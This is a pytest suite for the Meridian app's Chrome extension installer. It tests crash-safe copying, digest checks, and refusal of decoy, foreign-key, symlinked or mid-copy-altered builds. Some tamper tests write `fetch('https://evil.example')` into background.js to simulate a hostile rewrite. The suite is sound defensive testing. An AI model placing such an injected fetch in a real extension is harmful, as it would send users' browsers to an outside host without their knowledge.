"""The Chrome extension folder shipped with Meridian: stable install location, crash recovery and manifest policy."""

import base64
import hashlib
import json
import os
import shutil
import stat
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent / "fixtures" / "extension"))
from harness import chrome_manifest  # noqa: E402
from jobagent.extension import CHROME_EXTENSION_IDS, assets  # noqa: E402

ROOT = Path(__file__).resolve().parents[2]
DIST = ROOT / "extension" / "dist"


def make_source(tmp_path, version="1.0.0", background="console.log('a')"):
    source = tmp_path / "src"
    chrome = source / "chrome"
    (chrome / "_locales" / "en").mkdir(parents=True, exist_ok=True)
    (chrome / "manifest.json").write_text(json.dumps(chrome_manifest(version)))
    (chrome / "background.js").write_text(background)
    (chrome / "_locales" / "en" / "messages.json").write_text("{}")
    return source


def listing(folder):
    return sorted(str(p.relative_to(folder)) for p in folder.rglob("*"))


# ------------------------------------------------------------------------------------------------ installer


def test_first_install_copies_the_build_to_a_stable_folder(tmp_path):
    source = make_source(tmp_path)
    (source / "chrome" / ".DS_Store").write_text("junk")
    (source / "chrome" / "background.js.map").write_text("{}")
    (source / "chrome" / "link").symlink_to("/etc/hosts")
    (source / "chrome" / "__pycache__").mkdir()
    (source / "chrome" / "__pycache__" / "x.pyc").write_text("x")
    data = tmp_path / "data"
    info = assets.install_chrome_extension(data, source)
    target = data / "extensions" / "chrome"
    assert info["installed"] and info["changed"] and info["version"] == "1.0.0" and info["path"] == str(target)
    assert listing(target) == ["_locales", "_locales/en", "_locales/en/messages.json", "background.js", "manifest.json"]
    assert (target / "background.js").read_text() == "console.log('a')"
    # the marker lives beside the folder, never inside it (Chrome warns about foreign files)
    marker = json.loads((data / "extensions" / "chrome.install.json").read_text())
    assert marker == {"version": "1.0.0", "digest": info["digest"]}
    assert not any(p.name.endswith(".install.json") for p in target.rglob("*"))
    assert sorted(p.name for p in (data / "extensions").iterdir()) == ["chrome", "chrome.install.json"]
    # permissions: readable by Chrome, writable by the owner only
    assert stat.S_IMODE(target.stat().st_mode) == 0o755 and stat.S_IMODE((target / "manifest.json").stat().st_mode) == 0o644
    assert stat.S_IMODE((data / "extensions").stat().st_mode) == 0o700


def test_unchanged_build_is_not_touched(tmp_path):
    source = make_source(tmp_path)
    data = tmp_path / "data"
    assets.install_chrome_extension(data, source)
    background = data / "extensions" / "chrome" / "background.js"
    inode, stamp = background.stat().st_ino, background.stat().st_mtime_ns
    again = assets.install_chrome_extension(data, source)
    assert again["changed"] is False
    assert background.stat().st_ino == inode and background.stat().st_mtime_ns == stamp


def test_changed_build_replaces_the_folder_and_drops_removed_files(tmp_path):
    source = make_source(tmp_path)
    (source / "chrome" / "old.js").write_text("old")
    data = tmp_path / "data"
    assets.install_chrome_extension(data, source)
    (source / "chrome" / "old.js").unlink()
    (source / "chrome" / "background.js").write_text("console.log('b')")
    (source / "chrome" / "manifest.json").write_text(json.dumps(chrome_manifest("1.0.1")))
    info = assets.install_chrome_extension(data, source)
    target = data / "extensions" / "chrome"
    assert info["changed"] and info["version"] == "1.0.1"
    assert (target / "background.js").read_text() == "console.log('b')" and not (target / "old.js").exists()
    assert sorted(p.name for p in (data / "extensions").iterdir()) == ["chrome", "chrome.install.json"]  # no leftovers
    assert assets.installed_info(data) == {"installed": True, "path": str(target), "version": "1.0.1"}


def test_crash_between_the_two_renames_heals_on_the_next_start(tmp_path):
    source = make_source(tmp_path)
    data = tmp_path / "data"
    assets.install_chrome_extension(data, source)
    base = data / "extensions"
    os.rename(base / "chrome", base / ".chrome.old-1")  # the old folder was retired, the new one never arrived
    (base / ".chrome.new-9").mkdir()
    (base / ".chrome.new-9" / "partial.js").write_text("half")
    assert assets.installed_info(data)["installed"] is False
    info = assets.install_chrome_extension(data, source)
    assert info["changed"] is True
    assert sorted(p.name for p in base.iterdir()) == ["chrome", "chrome.install.json"]
    assert (base / "chrome" / "manifest.json").is_file()


def test_missing_marker_or_tampered_folder_is_repaired(tmp_path):
    source = make_source(tmp_path)
    data = tmp_path / "data"
    assets.install_chrome_extension(data, source)
    (data / "extensions" / "chrome.install.json").unlink()  # crash before the marker was written
    assert assets.install_chrome_extension(data, source)["changed"] is True
    (data / "extensions" / "chrome" / "manifest.json").unlink()  # someone damaged the install
    assert assets.install_chrome_extension(data, source)["changed"] is True
    assert (data / "extensions" / "chrome" / "manifest.json").is_file()


def test_nothing_bundled_is_reported_not_raised(tmp_path, monkeypatch):
    monkeypatch.setattr(assets, "extension_source", lambda: None)
    result = assets.install_chrome_extension(tmp_path / "data")
    assert result["installed"] is False and "not bundled" in result["reason"]
    assert assets.bundled_version() == "0.0.0"


def test_digest_covers_content_and_paths_but_not_junk(tmp_path):
    source = make_source(tmp_path)
    chrome = source / "chrome"
    base = assets.tree_digest(chrome)
    (chrome / ".DS_Store").write_text("junk")
    (chrome / "x.js.map").write_text("map")
    (chrome / "link").symlink_to("/etc/hosts")
    assert assets.tree_digest(chrome) == base
    (chrome / "background.js").write_text("changed")
    changed = assets.tree_digest(chrome)
    assert changed != base
    (chrome / "background.js").rename(chrome / "renamed.js")
    assert assets.tree_digest(chrome) not in (base, changed)


# ------------------------------------------------------------------------------------------------ packaged build


def lock_down(root):
    """Files extracted from a signed .app are read-only: 0444 files in 0555 folders."""
    for path in sorted(Path(root).rglob("*"), reverse=True):
        path.chmod(0o555 if path.is_dir() else 0o444)
    Path(root).chmod(0o555)


def unlock(root):
    for path in [Path(root), *Path(root).rglob("*")]:
        if path.exists() and not path.is_symlink():
            path.chmod(0o755 if path.is_dir() else 0o644)


def tree_state(root):
    return {
        str(path.relative_to(root)): (path.stat().st_mode, path.stat().st_mtime_ns,
                                       path.read_bytes() if path.is_file() else None)
        for path in sorted([Path(root), *Path(root).rglob("*")])
    }


@pytest.fixture
def packaged(tmp_path, monkeypatch, request):
    """Simulate a frozen sidecar: sys._MEIPASS points at a read-only extraction folder, no override, no checkout."""
    monkeypatch.delenv("MERIDIAN_EXTENSION_SRC", raising=False)

    def make(version="1.0.0", background="console.log('a')"):
        root = tmp_path / f"MEI-{version}"
        chrome = root / "extension" / "chrome"
        (chrome / "_locales" / "en").mkdir(parents=True)
        (chrome / "manifest.json").write_text(json.dumps(chrome_manifest(version)))
        (chrome / "background.js").write_text(background)
        (chrome / "_locales" / "en" / "messages.json").write_text("{}")
        lock_down(root)
        monkeypatch.setattr(sys, "_MEIPASS", str(root), raising=False)
        return root

    yield make
    unlock(tmp_path)  # also the copies a failing test left behind, so that pytest can clean the folder up


def test_a_frozen_bundle_is_found_where_pyinstaller_puts_it(packaged):
    root = packaged()
    assert assets.extension_source() == root / "extension"  # <_MEIPASS>/extension/chrome/manifest.json
    assert assets.bundled_version() == "1.0.0"
    assert not (root / "extension" / "chrome").stat().st_mode & 0o222  # really read-only


def test_a_read_only_bundle_installs_a_writable_copy_and_is_never_modified(packaged, tmp_path):
    root = packaged()
    before = tree_state(root)
    data = tmp_path / "data"
    info = assets.install_chrome_extension(data)  # no source argument: resolved from sys._MEIPASS
    target = data / "extensions" / "chrome"
    assert info["installed"] and info["changed"] and info["version"] == "1.0.0" and info["path"] == str(target)
    assert listing(target) == ["_locales", "_locales/en", "_locales/en/messages.json", "background.js", "manifest.json"]
    # the copy is the user's own: owner-writable (so the next update can replace it), readable by Chrome
    for path in [target, *target.rglob("*")]:
        assert os.access(path, os.W_OK), path
        assert stat.S_IMODE(path.stat().st_mode) == (0o755 if path.is_dir() else 0o644), path
    assert tree_state(root) == before  # the (signed) bundle was only read
    assert assets.install_chrome_extension(data)["changed"] is False  # and the second start does nothing at all
    assert tree_state(root) == before


def test_an_app_update_replaces_the_copy_made_from_a_read_only_bundle(packaged, tmp_path):
    packaged(version="1.0.0", background="console.log('old')")
    data = tmp_path / "data"
    assets.install_chrome_extension(data)
    packaged(version="1.1.0", background="console.log('new')")  # the next app version extracts somewhere else
    info = assets.install_chrome_extension(data)
    base = data / "extensions"
    assert info["changed"] is True and info["version"] == "1.1.0"
    assert (base / "chrome" / "background.js").read_text() == "console.log('new')"
    assert sorted(p.name for p in base.iterdir()) == ["chrome", "chrome.install.json"]  # the old copy was fully removed
    assert assets.installed_info(data)["version"] == "1.1.0" and assets.bundled_version() == "1.1.0"


def test_a_bundle_without_the_extension_is_reported_not_raised(tmp_path, monkeypatch):
    """A sidecar built without --add-data (or with extension/dist missing) must start; Settings explains it."""
    monkeypatch.delenv("MERIDIAN_EXTENSION_SRC", raising=False)
    empty = tmp_path / "MEI-empty"
    (empty / "extension").mkdir(parents=True)  # the folder exists but holds no chrome/manifest.json
    monkeypatch.setattr(sys, "_MEIPASS", str(empty), raising=False)
    monkeypatch.setattr(assets, "__file__", str(tmp_path / "nowhere" / "a" / "b" / "assets.py"))  # no checkout either
    assert assets.extension_source() is None
    result = assets.install_chrome_extension(tmp_path / "data")
    assert result["installed"] is False and "not bundled" in result["reason"]
    assert assets.bundled_version() == "0.0.0" and not (tmp_path / "data").exists()


# ------------------------------------------------------------------------------------------------ source and version


def test_an_unfrozen_run_prefers_the_override_then_the_repo_build(tmp_path, monkeypatch):
    env = make_source(tmp_path / "env")
    monkeypatch.delenv("MERIDIAN_EXTENSION_SRC", raising=False)
    monkeypatch.delattr(sys, "_MEIPASS", raising=False)
    monkeypatch.delattr(sys, "frozen", raising=False)
    assert assets.extension_source() in (None, DIST)
    monkeypatch.setenv("MERIDIAN_EXTENSION_SRC", str(env))
    assert assets.extension_source() == env  # the override wins
    monkeypatch.setenv("MERIDIAN_EXTENSION_SRC", str(tmp_path / "nothing-here"))
    assert assets.extension_source() in (None, DIST)  # an override that holds no extension falls through


def test_bundled_version_follows_the_manifest(tmp_path, monkeypatch):
    source = make_source(tmp_path, version="3.4.5")
    monkeypatch.setenv("MERIDIAN_EXTENSION_SRC", str(source))
    monkeypatch.delattr(sys, "_MEIPASS", raising=False)
    assert assets.bundled_version() == "3.4.5"
    manifest = source / "chrome" / "manifest.json"
    manifest.write_text(json.dumps(chrome_manifest("3.5.0")))
    os.utime(manifest, (manifest.stat().st_atime + 5, manifest.stat().st_mtime + 5))
    assert assets.bundled_version() == "3.5.0"
    manifest.write_text("{not json")
    os.utime(manifest, (manifest.stat().st_atime + 9, manifest.stat().st_mtime + 9))
    monkeypatch.setattr(assets, "source_candidates", lambda: [source])  # (a broken override would fall through to the repo)
    assert assets.bundled_version() == "0.0.0"


# ------------------------------------------------------------------------------------------------ what may be installed


FOREIGN_KEY = base64.b64encode(b"not the Meridian key " * 12).decode()


def frozen_sidecar(tmp_path, monkeypatch, *, bundle=True, mark_frozen=True):
    """The layout a real PyInstaller onefile has (measured): the code lives in <TMPDIR>/_MEIxxxx/jobagent/extension/
    assets.py, so ``__file__.parents[3]`` is the user's temporary directory itself, not a checkout. Returns (tmp, mei)."""
    temp = tmp_path / "tmp"
    mei = temp / "_MEI123456"
    (mei / "jobagent" / "extension").mkdir(parents=True)
    monkeypatch.setattr(assets, "__file__", str(mei / "jobagent" / "extension" / "assets.py"))
    monkeypatch.setattr(sys, "_MEIPASS", str(mei), raising=False)
    if mark_frozen:
        monkeypatch.setattr(sys, "frozen", True, raising=False)
    monkeypatch.delenv("MERIDIAN_EXTENSION_SRC", raising=False)
    monkeypatch.delenv("MERIDIAN_APP_BUNDLE", raising=False)
    if bundle:
        genuine = make_source(tmp_path / "genuine", version="1.0.0")
        shutil.copytree(genuine, mei / "extension")
    return temp, mei


def plant_decoy(temp, manifest, extra="decoy"):
    """What another local process can write: <TMPDIR>/extension/dist/chrome (the old repo fallback of a frozen sidecar)."""
    chrome = temp / "extension" / "dist" / "chrome"
    chrome.mkdir(parents=True)
    (chrome / "manifest.json").write_text(json.dumps(manifest))
    (chrome / "background.js").write_text(f"// {extra}")
    return chrome.parent


@pytest.mark.parametrize("decoy", ["pinned_manifest", "keyless_manifest"])
@pytest.mark.parametrize("mark", ["sys.frozen", "_MEIPASS_only"])
def test_a_frozen_sidecar_never_installs_a_folder_planted_beside_its_extraction_dir(tmp_path, monkeypatch, decoy, mark):
    """The bug: Path(__file__).parents[3]/extension/dist is $TMPDIR/extension/dist in a frozen sidecar, so a decoy there
    was installed as THE Chrome extension (the folder the user loads) and its version advertised. Even a decoy that
    copies the public key must lose: a frozen sidecar reads nothing but its own bundle."""
    temp, mei = frozen_sidecar(tmp_path, monkeypatch, bundle=False, mark_frozen=(mark == "sys.frozen"))
    manifest = chrome_manifest("6.6.6") if decoy == "pinned_manifest" else {"manifest_version": 3, "name": "DECOY", "version": "6.6.6"}
    planted = plant_decoy(temp, manifest)
    assert (planted / "chrome" / "manifest.json").is_file()
    assert assets.source_candidates() == [mei / "extension"]  # the repo fallback is not even a candidate
    assert assets.extension_source() is None
    assert assets.bundled_version() == "0.0.0"  # a decoy's version is not advertised either
    data = tmp_path / "data"
    result = assets.install_chrome_extension(data)
    assert result["installed"] is False and "not bundled" in result["reason"]
    assert not (data / "extensions").exists()  # nothing was copied anywhere


def test_a_frozen_sidecar_with_its_bundle_ignores_a_decoy_next_to_it(tmp_path, monkeypatch):
    temp, mei = frozen_sidecar(tmp_path, monkeypatch)
    plant_decoy(temp, chrome_manifest("6.6.6"))
    assert assets.extension_source() == mei / "extension"
    assert assets.bundled_version() == "1.0.0"
    info = assets.install_chrome_extension(tmp_path / "data")
    assert info["installed"] and info["version"] == "1.0.0"
    assert (tmp_path / "data" / "extensions" / "chrome" / "background.js").read_text() == "console.log('a')"


def test_a_frozen_sidecar_honours_the_override_only_inside_the_app_bundle_the_parent_announced(tmp_path, monkeypatch):
    temp, mei = frozen_sidecar(tmp_path, monkeypatch, bundle=False)
    outside = make_source(tmp_path / "outside", version="2.0.0")
    app = tmp_path / "Meridian.app"
    inside = make_source(app / "Contents" / "Resources" / "extension-chrome", version="3.0.0")
    # no announced bundle: whoever put MERIDIAN_EXTENSION_SRC there, a frozen sidecar does not follow it
    monkeypatch.setenv("MERIDIAN_EXTENSION_SRC", str(outside))
    assert assets.extension_source() is None
    monkeypatch.setenv("MERIDIAN_EXTENSION_SRC", str(inside))
    assert assets.extension_source() is None  # even a folder that WOULD be inside the app: nobody announced the app
    monkeypatch.setenv("MERIDIAN_APP_BUNDLE", str(app))
    assert assets.extension_source() == inside  # announced by the Tauri parent and inside it: accepted
    assert assets.bundled_version() == "3.0.0"
    monkeypatch.setenv("MERIDIAN_EXTENSION_SRC", str(outside))
    assert assets.extension_source() is None  # a path outside the announced bundle is refused
    monkeypatch.setenv("MERIDIAN_EXTENSION_SRC", str(app / ".." / "outside" / "src"))
    assert (outside / "chrome" / "manifest.json").is_file() and assets.extension_source() is None  # ".." does not escape
    link = app / "Contents" / "Resources" / "link"
    link.symlink_to(outside)
    monkeypatch.setenv("MERIDIAN_EXTENSION_SRC", str(link))
    assert assets.extension_source() is None  # a link inside the bundle that points out of it
    not_an_app = make_source(tmp_path / "not-an-app", version="4.0.0")  # a valid build inside a folder that is no .app
    monkeypatch.setenv("MERIDIAN_APP_BUNDLE", str(tmp_path / "not-an-app"))
    monkeypatch.setenv("MERIDIAN_EXTENSION_SRC", str(not_an_app))
    assert (not_an_app / "chrome" / "manifest.json").is_file() and assets.extension_source() is None  # only a .app counts


def test_the_override_still_works_in_development_and_ignores_the_announced_bundle(tmp_path, monkeypatch):
    env = make_source(tmp_path / "env")
    monkeypatch.delattr(sys, "_MEIPASS", raising=False)
    monkeypatch.delattr(sys, "frozen", raising=False)
    monkeypatch.setenv("MERIDIAN_EXTENSION_SRC", str(env))
    monkeypatch.setenv("MERIDIAN_APP_BUNDLE", str(tmp_path / "Meridian.app"))
    assert assets.extension_source() == env


def test_the_pinned_key_derives_the_pinned_id():
    key = (ROOT / "extension" / "manifest-key.txt").read_text().strip()
    assert assets.extension_id(key) == CHROME_EXTENSION_IDS[0]
    assert assets.manifest_problem(chrome_manifest()) is None
    for bad in (None, "", "   ", 5, ["x"], "%%%not base64%%%", "AAAA\nAAAA"):
        assert assets.extension_id(bad) is None, bad


@pytest.mark.parametrize("manifest", [
    {"manifest_version": 3, "name": "DECOY", "version": "6.6.6"},
    {"manifest_version": 3, "name": "Meridian Assistant", "version": "1.0.0", "key": ""},
    {"manifest_version": 3, "name": "Meridian Assistant", "version": "1.0.0", "key": "%%%"},
    {"manifest_version": 3, "name": "Meridian Assistant", "version": "1.0.0", "key": FOREIGN_KEY},
    {"manifest_version": 3, "name": "Meridian Assistant", "version": "1.0.0", "key": 7},
], ids=["no_key", "empty_key", "not_base64", "other_key", "number"])
def test_a_folder_whose_key_is_not_the_pinned_one_is_neither_found_nor_installed(tmp_path, monkeypatch, manifest):
    source = make_source(tmp_path)
    (source / "chrome" / "manifest.json").write_text(json.dumps(manifest))
    monkeypatch.delattr(sys, "_MEIPASS", raising=False)
    monkeypatch.delattr(sys, "frozen", raising=False)
    monkeypatch.setenv("MERIDIAN_EXTENSION_SRC", str(source))
    found, refusal = assets.inspect_source()
    assert found not in (source,) and isinstance(refusal, assets.UntrustedExtension)
    assert assets.extension_source() in (None, DIST)  # an untrusted override falls through to the repo build (or nothing)
    data = tmp_path / "data"
    if assets.extension_source() is None:
        assert assets.bundled_version() == "0.0.0"
    with pytest.raises(assets.UntrustedExtension) as raised:
        assets.install_chrome_extension(data, source)  # an explicit source gets the same verdict
    assert str(tmp_path) not in str(raised.value)  # a sentence, never a path
    assert not (data / "extensions" / "chrome").exists()


def test_an_untrusted_source_is_reported_instead_of_being_called_missing(tmp_path, monkeypatch):
    source = make_source(tmp_path)
    (source / "chrome" / "manifest.json").write_text(json.dumps({"manifest_version": 3, "version": "9.9.9"}))
    monkeypatch.setattr(assets, "source_candidates", lambda: [source])
    assert assets.extension_source() is None and assets.bundled_version() == "0.0.0"
    found, refusal = assets.inspect_source()
    assert found is None and isinstance(refusal, assets.UntrustedExtension)
    with pytest.raises(assets.UntrustedExtension, match="not pinned"):
        assets.install_chrome_extension(tmp_path / "data")
    assert not (tmp_path / "data").exists()


def test_a_key_that_is_only_valid_base64_is_not_enough(tmp_path):
    source = make_source(tmp_path)
    (source / "chrome" / "manifest.json").write_text(json.dumps(chrome_manifest(key=FOREIGN_KEY)))
    assert assets.manifest_problem(json.loads((source / "chrome" / "manifest.json").read_text())) == (
        "The extension in this build is not the Meridian Assistant (its key does not match the pinned id)")


def test_a_symlinked_manifest_is_refused(tmp_path):
    source = make_source(tmp_path)
    real = tmp_path / "elsewhere.json"
    real.write_text(json.dumps(chrome_manifest("7.0.0")))
    (source / "chrome" / "manifest.json").unlink()
    (source / "chrome" / "manifest.json").symlink_to(real)
    with pytest.raises(assets.UntrustedExtension, match="link"):
        assets.install_chrome_extension(tmp_path / "data", source)


def test_the_installer_judges_the_copy_not_the_source_it_looked_at_a_moment_ago(tmp_path):
    """A same-size, same-timestamp rewrite of the source manifest (a cached verdict would still say "fine") is caught by
    the check of the staged copy, and nothing replaces the folder the user already has."""
    source = make_source(tmp_path)
    data = tmp_path / "data"
    assets.install_chrome_extension(data, source)
    before = (data / "extensions" / "chrome" / "manifest.json").read_text()
    manifest = source / "chrome" / "manifest.json"
    assert assets._judge(manifest) is None  # the verdict is now cached under the file's stamp
    original = manifest.stat()
    foreign = json.dumps(chrome_manifest("2.0.0", key=FOREIGN_KEY))
    assert len(foreign) <= original.st_size
    manifest.write_text(foreign.ljust(original.st_size))  # valid JSON, the same size, the same inode
    os.utime(manifest, ns=(original.st_atime_ns, original.st_mtime_ns))
    assert assets._judge(manifest) is None  # stale on purpose: that is why the copy is judged again
    with pytest.raises(assets.UntrustedExtension):
        assets.install_chrome_extension(data, source)
    assert (data / "extensions" / "chrome" / "manifest.json").read_text() == before
    assert sorted(path.name for path in (data / "extensions").iterdir()) == ["chrome", "chrome.install.json"]


def test_a_source_that_changes_while_it_is_copied_is_refused_and_leaves_the_install_alone(tmp_path, monkeypatch):
    source = make_source(tmp_path)
    data = tmp_path / "data"
    assets.install_chrome_extension(data, source)
    installed = data / "extensions" / "chrome"
    snapshot = {p.relative_to(installed).as_posix(): p.read_bytes() for p in installed.rglob("*") if p.is_file()}
    (source / "chrome" / "background.js").write_text("console.log('b')")  # a new build, so a copy is needed
    real_copytree = shutil.copytree

    def racing(src, dst, *args, **kwargs):
        result = real_copytree(src, dst, *args, **kwargs)
        if Path(dst).name.startswith(".chrome.new"):  # the top-level copy, not its recursion
            (Path(dst) / "background.js").write_text("fetch('https://evil.example')")  # after the digest was taken
        return result

    monkeypatch.setattr(assets.shutil, "copytree", racing)
    with pytest.raises(assets.UntrustedExtension, match="changed while"):
        assets.install_chrome_extension(data, source)
    monkeypatch.undo()
    assert {p.relative_to(installed).as_posix(): p.read_bytes() for p in installed.rglob("*") if p.is_file()} == snapshot
    assert sorted(path.name for path in (data / "extensions").iterdir()) == ["chrome", "chrome.install.json"]  # no staging left


def test_a_changed_installed_folder_is_repaired_at_every_start_but_chromes_own_files_are_left_alone(tmp_path):
    source = make_source(tmp_path)
    data = tmp_path / "data"
    assets.install_chrome_extension(data, source)
    target = data / "extensions" / "chrome"
    (target / "_metadata").mkdir()
    (target / "_metadata" / "verified_contents.json").write_text("{}")  # what Chrome may add itself
    assert assets.install_chrome_extension(data, source)["changed"] is False
    for tamper in (
        lambda: (target / "background.js").write_text("fetch('https://evil.example')"),
        lambda: (target / "extra.js").write_text("x"),
        lambda: (target / "_locales" / "en" / "messages.json").unlink(),
        lambda: (target / "manifest.json").write_text(json.dumps(chrome_manifest("1.0.0", key=FOREIGN_KEY))),
    ):
        tamper()
        again = assets.install_chrome_extension(data, source)  # same marker, same source: only the folder differs
        assert again["changed"] is True
        assert assets.tree_digest(target) == again["digest"] == assets.tree_digest(source / "chrome")
        assert assets.installed_info(data)["installed"] is True
        assert assets.install_chrome_extension(data, source)["changed"] is False


def test_an_installed_folder_with_a_foreign_manifest_is_not_reported_as_installed(tmp_path):
    source = make_source(tmp_path)
    data = tmp_path / "data"
    assets.install_chrome_extension(data, source)
    target = data / "extensions" / "chrome"
    (target / "manifest.json").write_text(json.dumps({"manifest_version": 3, "name": "X", "version": "1.0.0"}))
    info = assets.installed_info(data)
    assert info["installed"] is False and info["version"] == "" and "not pinned" in info["problem"]
    (target / "manifest.json").write_text(json.dumps(chrome_manifest("1.0.0", key=FOREIGN_KEY)))
    assert assets.installed_info(data)["installed"] is False
    assert assets.install_chrome_extension(data, source)["changed"] is True
    assert assets.installed_info(data)["installed"] is True


def test_an_installed_folder_that_became_a_link_is_replaced_by_a_real_folder(tmp_path):
    source = make_source(tmp_path)
    data = tmp_path / "data"
    assets.install_chrome_extension(data, source)
    target = data / "extensions" / "chrome"
    elsewhere = tmp_path / "elsewhere"
    shutil.copytree(target, elsewhere)  # identical content, so only the link itself is wrong
    shutil.rmtree(target)
    target.symlink_to(elsewhere)
    assert assets.install_chrome_extension(data, source)["changed"] is True
    assert target.is_dir() and not target.is_symlink()
    assert (elsewhere / "manifest.json").is_file()  # what the link pointed at is untouched
    assert sorted(path.name for path in (data / "extensions").iterdir()) == ["chrome", "chrome.install.json"]


@pytest.mark.parametrize("version,reference,older", [
    ("0.1.0", "0.1.1", True), ("0.1.1", "0.1.0", False), ("0.1.0", "0.1.0", False), ("0.9.0", "0.10.0", True),
    ("1", "1.0.0", False), ("1.0", "1.0.1", True), ("", "0.0.1", True), (None, "0.0.1", True), ("2.0.0", "1.9.9", False),
    ("0.1.0-beta", "0.1.0", False),
])
def test_version_comparison(version, reference, older):
    assert assets.is_older(version, reference) is older


# ------------------------------------------------------------------------------------------------ built manifest policy


def built(variant):
    manifest = DIST / variant / "manifest.json"
    if not manifest.is_file():
        pytest.skip(f"extension/dist/{variant} has not been built (cd extension && npm run build)")
    return DIST / variant, json.loads(manifest.read_text())


def extension_id(key):
    digest = hashlib.sha256(base64.b64decode(key)).hexdigest()[:32]
    return "".join(chr(ord("a") + int(ch, 16)) for ch in digest)


def test_chrome_manifest_is_mv3_pinned_and_minimal():
    folder, manifest = built("chrome")
    tauri = json.loads((ROOT / "src-tauri" / "tauri.conf.json").read_text())
    ats = json.loads((ROOT / "extension" / "ats-hosts.json").read_text())["matches"]
    assert manifest["manifest_version"] == 3
    assert manifest["version"] == tauri["version"]  # the extension and the app are released together
    assert manifest["short_name"] == "Meridian" and manifest["name"].startswith("__MSG_")
    assert manifest["key"] == (ROOT / "extension" / "manifest-key.txt").read_text().strip()
    assert extension_id(manifest["key"]) == CHROME_EXTENSION_IDS[0]  # the pinned id the bridge recognises
    assert int(manifest["minimum_chrome_version"]) >= 110
    assert set(manifest["permissions"]) == {"activeTab", "scripting", "storage", "alarms"}
    assert set(manifest["host_permissions"]) == {"http://127.0.0.1/*", *ats}
    assert all(h == "http://127.0.0.1/*" or (h.startswith("https://") and not h.startswith("https://*/")) for h in manifest["host_permissions"])
    assert manifest["optional_host_permissions"] == ["https://*/*", "http://*/*"]
    assert manifest["background"] == {"service_worker": "background.js"}
    assert "action" in manifest and "default_popup" not in manifest["action"]  # the toolbar click activates the page
    scripts = manifest["content_scripts"]
    assert len(scripts) == 1 and scripts[0]["js"] == ["hint.js"] and set(scripts[0]["matches"]) == set(ats)
    assert scripts[0]["all_frames"] is False
    for forbidden in ("externally_connectable", "web_accessible_resources", "declarative_net_request", "devtools_page",
                      "chrome_url_overrides", "oauth2", "update_url", "sandbox"):
        assert forbidden not in manifest, forbidden
    csp = json.dumps(manifest.get("content_security_policy", ""))
    assert "unsafe-eval" not in csp and "http:" not in csp and "https:" not in csp
    text = json.dumps(manifest)
    assert "<all_urls>" not in text and "*://*/*" not in text and '"tabs"' not in text and "webRequest" not in text


def test_every_file_the_manifest_names_exists():
    folder, manifest = built("chrome")
    named = [manifest["background"]["service_worker"], manifest["options_ui"]["page"], *manifest["icons"].values(),
             *manifest["action"]["default_icon"].values(), f"_locales/{manifest['default_locale']}/messages.json"]
    for script in manifest["content_scripts"]:
        named += script["js"]
    assert [path for path in named if not (folder / path).is_file()] == []


def test_the_shipped_folder_is_clean():
    folder, _ = built("chrome")
    junk = [p.name for p in folder.rglob("*") if p.name.startswith(".") or p.suffix == ".map" or p.is_symlink()]
    assert junk == []
    assert not any("__E2E__" in p.read_text(errors="ignore") for p in folder.glob("*.js"))  # test hooks never ship


def test_safari_manifest_has_no_pinned_key_and_the_same_permissions():
    _, manifest = built("safari")
    chrome = built("chrome")[1]
    assert manifest["manifest_version"] == 3 and manifest["version"] == chrome["version"]
    assert "key" not in manifest and "minimum_chrome_version" not in manifest
    assert set(manifest["permissions"]) == set(chrome["permissions"])
    assert set(manifest["host_permissions"]) == set(chrome["host_permissions"])
    assert manifest["optional_host_permissions"] == chrome["optional_host_permissions"]
    assert "safari" in manifest.get("browser_specific_settings", {})


def test_installing_the_real_build_matches_the_manifest(tmp_path):
    built("chrome")
    info = assets.install_chrome_extension(tmp_path, DIST)
    manifest = json.loads((Path(info["path"]) / "manifest.json").read_text())
    assert info["installed"] and info["version"] == manifest["version"]
    assert assets.tree_digest(DIST / "chrome") == info["digest"] == assets.tree_digest(Path(info["path"]))
